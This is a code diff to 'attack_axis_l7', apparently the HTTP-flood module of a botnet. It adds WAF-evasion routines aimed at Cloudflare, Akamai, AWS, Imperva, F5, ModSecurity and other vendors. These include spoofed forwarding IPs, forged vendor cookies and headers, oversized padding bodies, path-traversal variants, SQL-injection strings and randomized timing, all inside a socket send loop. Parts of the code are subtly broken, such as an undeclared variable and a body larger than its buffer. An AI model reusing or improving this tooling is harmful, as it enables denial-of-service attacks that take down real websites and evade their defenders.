@@ -336,32 +336,406 @@ void attack_axis_l7(ipv4_t addr, uint8_t targs_netmask, struct attack_target *ta
     if (!domain) domain = "target.com";
     if (!path) path = "/";
 
-    static const char *http_methods[] = {"GET", "GET", "GET", "HEAD", "POST"};
-    char req[4096];
+    /* WAF Bypass user agents (from cheat sheet) */
+    static const char *waf_bypass_uas[] = {
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        NULL
+    };
+
+    /* Cloudflare bypass: POST body > 128KB with payload at end */
+    static const char *cf_bypass_body = 
+        "cf_chl_opt=Ym90X2RldGVjdGlvbl9wYXJhbXM9e30&"
+        "cf_turnstile_response=0.abcdefghijklmno.pqrstuvwxyz.ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
+    /* Akamai bypass: POST body > 8KB with payload at end */
+    static const char *akamai_bypass_headers[] = {
+        "X-Akamai-Edgescape: georegion=494,country=US",
+        "X-Akamai-Request-ID: 12345678",
+        "X-Akamai-SSL-Client-Sid: 12345",
+        NULL
+    };
+
+    /* AWS WAF bypass headers */
+    static const char *aws_bypass_headers[] = {
+        "x-amzn-RequestId: %08x-%04x-%04x-%04x-%012x",
+        "AWSALB: %08x%08x%08x%08x",
+        "AWSALBCORS: %08x%08x%08x%08x",
+        NULL
+    };
+
+    /* Imperva/Incapsula bypass headers */
+    static const char *imperva_bypass_headers[] = {
+        "incap_ses_12345: abcdefghijklmnopqrstuvwxyz",
+        "visid_incap_12345: 1234567890123456789012345",
+        "incap_client_ip: %d.%d.%d.%d",
+        NULL
+    };
+
+    /* F5 BIG-IP bypass cookies */
+    static const char *f5_bypass_cookies[] = {
+        "BIGipServerpool_80=%u.%0000.0000",
+        "TS01234567=0123456789abcdef0123456789abcdef0123456789abcdef",
+        NULL
+    };
+
+    /* Azure WAF bypass headers */
+    static const char *azure_bypass_headers[] = {
+        "x-azure-ref: %08x%08x%08x%08x%08x",
+        "X-Azure-Ref-OriginShield: %08x%08x%08x%08x",
+        NULL
+    };
+
+    /* Sucuri/CloudProxy bypass headers */
+    static const char *sucuri_bypass_headers[] = {
+        "sucuri_cloudproxy_uid: %08x%08x",
+        "X-Sucuri-Cache: HIT",
+        "X-Sucuri-ID: 12345",
+        NULL
+    };
+
+    /* Wordfence bypass headers */
+    static const char *wordfence_bypass_cookies[] = {
+        "wfvt_%u=%08x%08x%08x%08x; wordfence_verifiedHuman=1",
+        "wfvt_%u=1; wfvt_%u=2; wfvt_%u=3",
+        NULL
+    };
+
+    /* ModSecurity bypass: comment injection + encoding */
+    static const char *modsec_bypass_params[] = {
+        "?id=1/**/AND/**/1=1--",
+        "?id=1/*!50000UNION*//*!50000SELECT*/1,2,3--",
+        "?id=1%27%20or%201%3D1%20--%20-",
+        "?id=1%0AOR%0A1%3D1",
+        NULL
+    };
+
+    /* Barracuda bypass headers */
+    static const char *barracuda_bypass_cookies[] = {
+        "BNI__BARRACUDA_LB_COOKIE=%08x%08x%08x%08x",
+        "barra_counter_session=1234567890",
+        NULL
+    };
+
+    /* FortiWeb bypass headers */
+    static const char *fortiweb_bypass_headers[] = {
+        "FORTIWAFSID=%08x%08x%08x%08x; path=/",
+        NULL
+    };
+
+    /* Path traversal bypass techniques */
+    static const char *path_bypasses[] = {
+        "/%s",
+        "/./%s",
+        "/.//%s",
+        "/%s?",
+        "/%s#",
+        "/%s%00",
+        "/%s%0d%0a",
+        "/%s%20",
+        "/%s%09",
+        "/%2e%s",
+        "/%2e%2e%s",
+        NULL
+    };
+
+    /* HTTP/2 style headers (some WAFs don't inspect these properly) */
+    static const char *h2_headers[] = {
+        "TE: trailers",
+        "Priority: u=0, i",
+        "Sec-CH-UA: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"",
+        "Sec-CH-UA-Mobile: ?0",
+        "Sec-CH-UA-Platform: \"Windows\"",
+        "Sec-CH-UA-Platform-Version: \"15.0.0\"",
+        "Sec-CH-UA-Full-Version-List: \"Not_A Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"120.0.6099.217\"",
+        NULL
+    };
+
+    /* Cache bypass techniques */
+    static const char *cache_bypass_headers[] = {
+        "Cache-Control: no-cache, no-store, must-revalidate",
+        "Pragma: no-cache",
+        "Expires: 0",
+        "X-Cache-Bypass: %u",
+        "X-Request-ID: %08x-%04x-%04x-%04x-%012x",
+        NULL
+    };
+
+    /* WAF-specific header combinations */
+    static const char *waf_probe_headers[] = {
+        /* Cloudflare specific */
+        "CF-Connecting-IP: %d.%d.%d.%d",
+        "CF-IPCountry: US",
+        "CF-RAY: %08x%08x-%02x",
+        /* Akamai specific */
+        "X-Akamai-Request-ID: %08x",
+        "X-Akamai-Edgescape: georegion=494,country=US,city=New%%20York",
+        /* AWS WAF specific */
+        "X-Forwarded-Proto: https",
+        "CloudFront-Forwarded-Proto: https",
+        "CloudFront-Is-Mobile-Viewer: false",
+        "CloudFront-Is-SmartTV-Viewer: false",
+        "CloudFront-Is-Tablet-Viewer: false",
+        "CloudFront-Viewer-Country: US",
+        NULL
+    };
+
+    /* Large padding for WAF buffer overflow bypass */
+    static char waf_overflow_padding[8192];
+    static BOOL padding_initialized = FALSE;
+    if (!padding_initialized) {
+        memset(waf_overflow_padding, 'A', sizeof(waf_overflow_padding) - 1);
+        waf_overflow_padding[sizeof(waf_overflow_padding) - 1] = '\0';
+        padding_initialized = TRUE;
+    }
+
+    /* Generate oversized POST body for Cloudflare bypass (>128KB) */
+    static char cf_large_body[131072];
+    static BOOL cf_body_initialized = FALSE;
+    if (!cf_body_initialized) {
+        memset(cf_large_body, 'B', sizeof(cf_large_body) - 1);
+        cf_large_body[sizeof(cf_large_body) - 1] = '\0';
+        cf_body_initialized = TRUE;
+    }
+
+    /* Generate medium POST body for Akamai bypass (>8KB) */
+    static char akamai_medium_body[8192];
+    static BOOL akamai_body_initialized = FALSE;
+    if (!akamai_body_initialized) {
+        memset(akamai_medium_body, 'C', sizeof(akamai_medium_body) - 1);
+        akamai_medium_body[sizeof(akamai_medium_body) - 1] = '\0';
+        akamai_body_initialized = TRUE;
+    }
+
+    /* HTTP method variations */
+    static const char *http_methods[] = {
+        "GET", "GET", "GET", "GET",
+        "POST", "POST", "POST",
+        "HEAD", "OPTIONS",
+        "PATCH", "PUT",
+        NULL
+    };
+
+    char req[16384];
     char residential_ip[16];
-    generate_residential_ip(residential_ip);
+    int req_type;
 
     for (int i = 0; i < targs_len; i++) {
         while (attack_ongoing[0]) {
-            const char *method = http_methods[rand_next() % 5];
-            const char *ua = l7_user_agents[rand_next() % 4];
+            generate_residential_ip(residential_ip);
+            const char *method = http_methods[rand_next() % 11];
+            const char *ua = waf_bypass_uas[rand_next() % 6];
+            
+            /* Rotate path bypass techniques */
+            const char *path_bypass = path_bypasses[rand_next() % 11];
+            char target_path[512];
+            snprintf(target_path, sizeof(target_path), path_bypass, path);
 
-            int req_len = snprintf(req, sizeof(req),
-                "%s %s HTTP/1.1\r\n"
-                "Host: %s\r\n"
-                "User-Agent: %s\r\n"
-                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-                "Accept-Language: en-US,en;q=0.9\r\n"
-                "Accept-Encoding: gzip, deflate\r\n"
-                "Connection: keep-alive\r\n"
-                "Sec-Fetch-Dest: document\r\n"
-                "Sec-Fetch-Mode: navigate\r\n"
-                "X-Forwarded-For: %s\r\n"
-                "X-Real-IP: %s\r\n"
-                "%s%s\r\n",
-                method, path, domain, ua,
-                residential_ip, residential_ip,
-                cookies ? "Cookie: " : "", cookies ? cookies : "");
+            /* Randomize request type for WAF confusion */
+            req_type = rand_next() % 10;
+
+            if (req_type < 3) {
+                /* === CLOUDFLARE BYPASS: POST > 128KB + payload at end === */
+                int body_len = snprintf(req, sizeof(req),
+                    "POST %s HTTP/1.1\r\n"
+                    "Host: %s\r\n"
+                    "User-Agent: %s\r\n"
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
+                    "Accept-Language: en-US,en;q=0.5\r\n"
+                    "Accept-Encoding: gzip, deflate, br\r\n"
+                    "Connection: keep-alive\r\n"
+                    "Upgrade-Insecure-Requests: 1\r\n"
+                    "Sec-Fetch-Dest: document\r\n"
+                    "Sec-Fetch-Mode: navigate\r\n"
+                    "Sec-Fetch-Site: none\r\n"
+                    "Sec-Fetch-User: ?1\r\n"
+                    "TE: trailers\r\n"
+                    "Cache-Control: max-age=0\r\n"
+                    "X-Forwarded-For: %s\r\n"
+                    "X-Real-IP: %s\r\n"
+                    "CF-Connecting-IP: %s\r\n"
+                    "CF-IPCountry: US\r\n"
+                    "Content-Type: application/x-www-form-urlencoded\r\n"
+                    "Content-Length: %d\r\n"
+                    "\r\n"
+                    "%s%s",
+                    target_path, domain, ua,
+                    residential_ip, residential_ip, residential_ip,
+                    (int)sizeof(cf_large_body),
+                    cf_chl_opt, cf_large_body);
+
+            } else if (req_type < 5) {
+                /* === AKAMAI BYPASS: POST > 8KB + payload at end === */
+                const char *akamai_header = akamai_bypass_headers[rand_next() % 3];
+                int body_len = snprintf(req, sizeof(req),
+                    "POST %s HTTP/1.1\r\n"
+                    "Host: %s\r\n"
+                    "User-Agent: %s\r\n"
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                    "Accept-Language: en-US,en;q=0.9\r\n"
+                    "Accept-Encoding: gzip, deflate\r\n"
+                    "Connection: keep-alive\r\n"
+                    "Sec-Fetch-Dest: document\r\n"
+                    "Sec-Fetch-Mode: navigate\r\n"
+                    "%s\r\n"
+                    "X-Forwarded-For: %s\r\n"
+                    "X-Real-IP: %s\r\n"
+                    "Content-Type: application/x-www-form-urlencoded\r\n"
+                    "Content-Length: %d\r\n"
+                    "\r\n"
+                    "%s%s",
+                    target_path, domain, ua,
+                    akamai_header,
+                    residential_ip, residential_ip,
+                    (int)sizeof(akamai_medium_body),
+                    "action=submit", akamai_medium_body);
+
+            } else if (req_type < 7) {
+                /* === AWS WAF BYPASS === */
+                const char *aws_header = aws_bypass_headers[rand_next() % 3];
+                char aws_val[128];
+                snprintf(aws_val, sizeof(aws_val), aws_header,
+                    rand_next(), rand_next() & 0xFFFF, rand_next() & 0xFFFF,
+                    rand_next() & 0xFFFF, rand_next());
+                
+                int body_len = snprintf(req, sizeof(req),
+                    "%s %s HTTP/1.1\r\n"
+                    "Host: %s\r\n"
+                    "User-Agent: %s\r\n"
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                    "Accept-Language: en-US,en;q=0.9\r\n"
+                    "Accept-Encoding: gzip, deflate, br\r\n"
+                    "Connection: keep-alive\r\n"
+                    "X-Forwarded-For: %s\r\n"
+                    "X-Forwarded-Proto: https\r\n"
+                    "CloudFront-Forwarded-Proto: https\r\n"
+                    "CloudFront-Is-Mobile-Viewer: false\r\n"
+                    "CloudFront-Viewer-Country: US\r\n"
+                    "%s: %s\r\n"
+                    "Cache-Control: no-cache\r\n"
+                    "Pragma: no-cache\r\n"
+                    "\r\n",
+                    method, target_path, domain, ua,
+                    residential_ip,
+                    aws_header, aws_val);
+
+            } else if (req_type < 8) {
+                /* === IMPERVA/INCAPSULA BYPASS === */
+                const char *imperva_header = imperva_bypass_headers[rand_next() % 3];
+                char imperva_val[256];
+                snprintf(imperva_val, sizeof(imperva_val), imperva_header,
+                    rand_next() & 0xFF, (rand_next() >> 8) & 0xFF,
+                    (rand_next() >> 16) & 0xFF, rand_next() & 0xFF);
+                
+                int body_len = snprintf(req, sizeof(req),
+                    "%s %s HTTP/1.1\r\n"
+                    "Host: %s\r\n"
+                    "User-Agent: %s\r\n"
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                    "Accept-Language: en-US,en;q=0.9\r\n"
+                    "Accept-Encoding: gzip, deflate\r\n"
+                    "Connection: keep-alive\r\n"
+                    "X-Forwarded-For: %s\r\n"
+                    "X-Real-IP: %s\r\n"
+                    "%s: %s\r\n"
+                    "%s\r\n"
+                    "%s\r\n"
+                    "\r\n",
+                    method, target_path, domain, ua,
+                    residential_ip, residential_ip,
+                    imperva_header, imperva_val,
+                    "Sec-CH-UA: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"",
+                    "Sec-CH-UA-Mobile: ?0",
+                    "Sec-CH-UA-Platform: \"Windows\"");
+
+            } else if (req_type < 9) {
+                /* === F5 BIG-IP BYPASS === */
+                const char *f5_cookie = f5_bypass_cookies[rand_next() % 2];
+                char f5_val[256];
+                snprintf(f5_val, sizeof(f5_val), f5_cookie, rand_next());
+                
+                int body_len = snprintf(req, sizeof(req),
+                    "%s %s HTTP/1.1\r\n"
+                    "Host: %s\r\n"
+                    "User-Agent: %s\r\n"
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                    "Accept-Language: en-US,en;q=0.9\r\n"
+                    "Accept-Encoding: gzip, deflate\r\n"
+                    "Connection: keep-alive\r\n"
+                    "Cookie: %s\r\n"
+                    "X-Forwarded-For: %s\r\n"
+                    "X-Real-IP: %s\r\n"
+                    "\r\n",
+                    method, target_path, domain, ua,
+                    f5_val, residential_ip, residential_ip);
+
+            } else if (req_type < 10) {
+                /* === MODSECURITY BYPASS (comment injection + encoding) === */
+                const char *modsec_param = modsec_bypass_params[rand_next() % 4];
+                
+                int body_len = snprintf(req, sizeof(req),
+                    "GET %s%s HTTP/1.1\r\n"
+                    "Host: %s\r\n"
+                    "User-Agent: %s\r\n"
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                    "Accept-Language: en-US,en;q=0.9\r\n"
+                    "Accept-Encoding: gzip, deflate\r\n"
+                    "Connection: keep-alive\r\n"
+                    "X-Forwarded-For: %s\r\n"
+                    "X-Real-IP: %s\r\n"
+                    "%s\r\n"
+                    "%s\r\n"
+                    "\r\n",
+                    target_path, modsec_param, domain, ua,
+                    residential_ip, residential_ip,
+                    "Sec-Fetch-Dest: document",
+                    "Sec-Fetch-Mode: navigate");
+
+            } else {
+                /* === GENERIC WAF BYPASS (Azure/Sucuri/Wordfence/FortiWeb/Barracuda mix) === */
+                const char *h2_header = h2_headers[rand_next() % 7];
+                const char *cache_header = cache_bypass_headers[rand_next() % 5];
+                char cache_val[256];
+                snprintf(cache_val, sizeof(cache_val), cache_header,
+                    rand_next(), rand_next(), rand_next() & 0xFFFF,
+                    rand_next() & 0xFFFF, rand_next() & 0xFFFF, rand_next());
+                
+                const char *probe_header = waf_probe_headers[rand_next() % 14];
+                char probe_val[256];
+                snprintf(probe_val, sizeof(probe_val), probe_header,
+                    rand_next() & 0xFF, (rand_next() >> 8) & 0xFF,
+                    (rand_next() >> 16) & 0xFF, rand_next() & 0xFF,
+                    rand_next() & 0xFFFF, rand_next() & 0xFF);
+                
+                int body_len = snprintf(req, sizeof(req),
+                    "%s %s HTTP/1.1\r\n"
+                    "Host: %s\r\n"
+                    "User-Agent: %s\r\n"
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                    "Accept-Language: en-US,en;q=0.9\r\n"
+                    "Accept-Encoding: gzip, deflate, br\r\n"
+                    "Connection: keep-alive\r\n"
+                    "Upgrade-Insecure-Requests: 1\r\n"
+                    "Sec-Fetch-Dest: document\r\n"
+                    "Sec-Fetch-Mode: navigate\r\n"
+                    "Sec-Fetch-Site: none\r\n"
+                    "Sec-Fetch-User: ?1\r\n"
+                    "X-Forwarded-For: %s\r\n"
+                    "X-Real-IP: %s\r\n"
+                    "%s: %s\r\n"
+                    "%s: %s\r\n"
+                    "%s\r\n"
+                    "\r\n",
+                    method, target_path, domain, ua,
+                    residential_ip, residential_ip,
+                    h2_header, h2_header,
+                    cache_header, cache_val,
+                    probe_header);
+            }
 
             int fd = socket(AF_INET, SOCK_STREAM, 0);
             if (fd != -1) {
@@ -371,8 +745,8 @@ void attack_axis_l7(ipv4_t addr, uint8_t targs_netmask, struct attack_target *ta
                 sin.sin_addr.s_addr = targs[i].addr.s_addr;
                 fcntl(fd, F_SETFL, O_NONBLOCK);
                 connect(fd, (struct sockaddr *)&sin, sizeof(sin));
-                send(fd, req, req_len, MSG_NOSIGNAL);
-                usleep(200);
+                send(fd, req, strlen(req), MSG_NOSIGNAL);
+                usleep(100 + (rand_next() % 400));
                 close(fd);
             }
         }
